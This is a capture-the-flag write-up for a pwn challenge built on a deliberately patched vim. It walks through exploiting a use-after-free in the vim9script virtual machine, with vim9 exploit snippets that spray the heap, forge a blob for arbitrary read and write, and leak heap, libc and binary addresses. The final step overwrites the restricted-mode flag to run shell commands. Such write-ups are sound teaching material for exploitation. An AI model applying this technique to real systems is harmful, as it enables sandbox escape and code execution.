## [pwn] :q\!\!\!\!\!\!\! (1 solve)
I found this weird verion of vim, it looks like :q! doesn't work anymore, can you help me to get out?

This is a remote challenge, you can connect with:

## Overview

In this challenge we are given a patch for the [vim](https://github.com/vim/vim) source code and the objective is to exploit the vim9script virtual machine.

We are given three patch files:
 - `security.patch`: deny access in any form to any file or directory containing `flag` or `proc` in its path, thus we cannot directly read the flag or leak addresses for free.
 - `jail.patch`: it's just a troll patch to make impossible to exit vim if not with a crash.
 - `bug.patch`: This is the important patch. A single line is removed from the `copy_object` function. With this patch, a ref counter increase is removed.

In addition to that, the vim executable has been renamed in `rust`, a name starting with `r`, placing us in restricted mode and blocking us from executing shell commands (I couldn't come up with a better name, sorry). The `m` flag is also set, disallowing writes to files, just an extra precaution since you shouldn't have the permissions to write anywhere important anyways. The other two flags are not relevant.


## vim9

Explaining how everything works is way too long for this writeup, so I will just cover the internals important for the exploitation. The docs for a broad understanding of the vim9 language are really well written, so you can refer to them [[1]](https://vimhelp.org/vim9.txt.html) [[2]](https://vimhelp.org/eval.txt.html#eval.txt). You are also supposed to read the source code to see in details how stuffs are handled.

Vim9 uses a stack based virtual machine to execute code. The stack is an array of `typval_T` objects, which are wrapper objects that contain the type, a lock and the pointer to the actual object. The `object_T` struct holds a bunch of pointers which we don't really care about, the ref counter, which is the subject of the vulnerability and an array of `typval_T` to hold the object fields (this is not written in the struct definition, but it is how it is implemented, I don't know why they haven't simply added a `typval_T fileds[];` filed). The effective implementation is:
```c
struct object_T {
	class_T *obj_class;
	int obj_refcount;
	object_T *obj_next_used;
	object_T *obj_prev_used;
	int obj_copyID;
	typval_T fields[];
};
```

We also need to look how blobs are implemented. They are basically raw data, for this reason they are perfect to be used for arbitrary read and write. The only problem is that they add a layer of indirection, since the `typval_T` points to a `blob_T` object which holds some informations about the object and the pointer to the raw data. You might think that strings are better, since they are just null terminated strings, but they are actually awful. First of all we will handle a lot of pointers, so, the null termination would be a huge problem, second, they don't have a ref count, instead they get copied every time you reference it, adding an enormous number of allocations that break every attempt of exploitation.


## Getting out of ~~vim~~ rust

The first thing to try is to reach the broken code. Even if the patched function is called `copy_object`, it gets called every time we reference an object, but even without knowing this, we can try to get a "copy" of an object and see what happens.
```vim
vim9script
class Foo
	def new()
	enddef
endclass

var obj1: Foo = Foo.new()
var obj2: Foo = obj1
```
(From now on, I will omit the `vim9script` header in the snippets).

Uhm... This does nothing. It is not crashing.

I am not 100% sure about this, but I think that this happens because, if you are not in a function, vim cannot compile what you are executing and just interpret it with something similar to the legacy vim script interpreter, so the bug is not triggered. Let's put the code in a function.

```vim
vim9script
class Foo
	def new()
	enddef
endclass

def Fun()
	var obj1: Foo = Foo.new()
	var obj2: Foo = obj1
enddef

Fun()
```

Aaaaand... `segmentation fault (core dumped)` Nice!

This doesn't happens all the times, though. Why?

First of all, we are dealing with a double free, it seg faults instead of aborting because when vim tries to free the object a second time, we will have the chunk `next_ptr` on top of the `obj_class` pointer, so it will dereference invalid memory. The reason why it doesn't crash every time is similar: when the object gets freed for the first time, the `tcache_key` will be placed on top of `obj_refcount`, thus, it will get double freed only when `(int)tcache_key < 0` and this happens only half of the times.


## Debugging tips
 - Make a debug build, the part when we need to hard-code constants dependent from the binary comes to the very end of the exploit.
 - Don't debug directly vim, instead attach to the process, otherwise your terminal will be so messed up.
 - A really nice place where to put a breakpoint is `vim9execute.c:3158`. This is the giant switch that selects the instruction to be executed.
 - You can see the disassembly of a function calling `disassemble Fun`
 - You can call `input("A")` to place a "breakpoint" inside your script, but most importantly, in the end of the function with the exploit, otherwise it's really likely that vim will crash during the cleanup and won't show you any output.


## Exploitation

The first fix that we can make to the crashing script is to not assign the first object to another object, but rather to reference it by passing it as an argument to a function. This because if you assign the object, it will get referenced twice: once to put it into the stack and once to actually copy it. This calls the object destructor two times crashing half of the times for the reason explained before.
```vim
def Ref(obj: any)
enddef

def Pwn()
	var obj: Foo = Foo.new()
	Ref(obj)
	input("A")
enddef
```

This will give us the uaf-ed object, but it is stable. It would crash half of the time after we press enter to continue from the `input` function, but at that point we will have arbitrary read and write and we will also be able to fix everything.

The final target of our exploit is the `restricted` bit in the binary, to allow us to run shell commands, so our best go is to achieve arbitrary read and write. As said before, blobs are (almost) perfect for this. Since we can break objects, we can try to hijack a blob pointer inside an object, so our class will look like this:
```vim
class BlobClass
	public this.b: blob
	def new()
	enddef
endclass
```

The size of this object will be `0x38`, with the last two `QWORD`s being the `typval_T` wrapper of the blob.

Before doing anything, we should spray a bit of 0x38 sized generic objects (I used blobs) to fill the tcache and make the heap more deterministic.

Now, let's try to overwrite an object with a lot of ~~`A`s~~ `\xff`s (the refcount has to be negative, otherwise it won't crash):
```vim
var blob_o: BlobClass = BlobClass.new()
Ref(blob_o)
var obj_replace: blob = 0zffffff...  # 0x38 times `ff`
```

If we debug this, we can see our `ff`s. Yay!

Without a leak we cannot do much, fortunately there is an easy way to get it: overwrite the refcount with something big so that it doesn't bother us, then reassign the blob field with a new blob et voilÃ .
```vim
var obj_replace: blob = 0z0000000000000000.3713000000000000.4141...
var blob_replace: blob = 0z41
blob_o.b = blob_replace
echo obj_replace[-0x8 :]
```

We can even do something better. Reassign the blob field with a blob of size `0x28`, the size of a `blob_T` struct, this way we can use that as our fake blob. Since the heap is not deterministic (because vim does stuffs), we still need to leak the blob `ga_data` field. We can do it using the `len` function since it just reads a `DWORD` from the blob object, indeed we already have (almost) arbitrary read. Almost because if the object is aligned such that the blob ref counter is 0 or a negative int value, the program will most likely crash trying to free a fake object. It turns out that we can leak the lower 32 bits of the `ga_data` pointer, but not the upper 32, but it doesn't matter, since we already have a heap leak and the upper 32 bits are the same.
```vim
var blob_replace: blob = 0z4141...
blob_o.b = blob_replace

var blob_address: number = BlobToNumber(obj_replace[-0x8 :])

SetBlobPointer(obj_replace, blob_address + 0x10)
var blob_data_address_low: number = and(len(blob_o.b), 0xffffffff)
var blob_data_address_high: number = blob_address >> 32
var blob_data_address: number = or(blob_data_address_low, blob_data_address_high << 32)
```

Perfect, now we can set the object's blob pointer to our fake blob and achieve arbitrary read and write:

```vim
SetValidBlob(blob_replace)
SetBlobPointer(obj_replace, blob_data_address)
if len(blob_o.b) != 0x1337
	echo "NO ARBITRARY BLOB"
	return
endif
```

Now we just have to scan the heap to leak libc, from that we can leak the binary and overwrite the `restricted` bit.
```vim
var libc_leak: number = -1
for i in range(blob_address - 0x10000, blob_address, 8)
	var maybe_libc: number = ReadQWORD(blob_replace, blob_o, i)
	if and(maybe_libc >> 40, 0xff) == 0x7f || and(maybe_libc >> 40, 0xff) == 0x7e
		if and(maybe_libc, 0xfff) == 0xc00
			libc_leak = maybe_libc
			break
		endif
	endif
endfor

var libc_address: number = libc_leak - 0x219c00
var stdout_ptr: number = libc_address + 0x218e38
var binary_leak = ReadQWORD(blob_replace, blob_o, stdout_ptr)
var binary_address: number = binary_leak - 0x379568
var restricted_address: number = binary_address + 0x384638
SetBlobDataPtr(blob_replace, restricted_address)
blob_o.b[0] = 0  # Also set `obj_class` to `NULL` so that the object doesn't get freed and the script can happly end without crashing
```

Finally we are not restricted anymore and we can cat the flag
```
!cat /flag
```
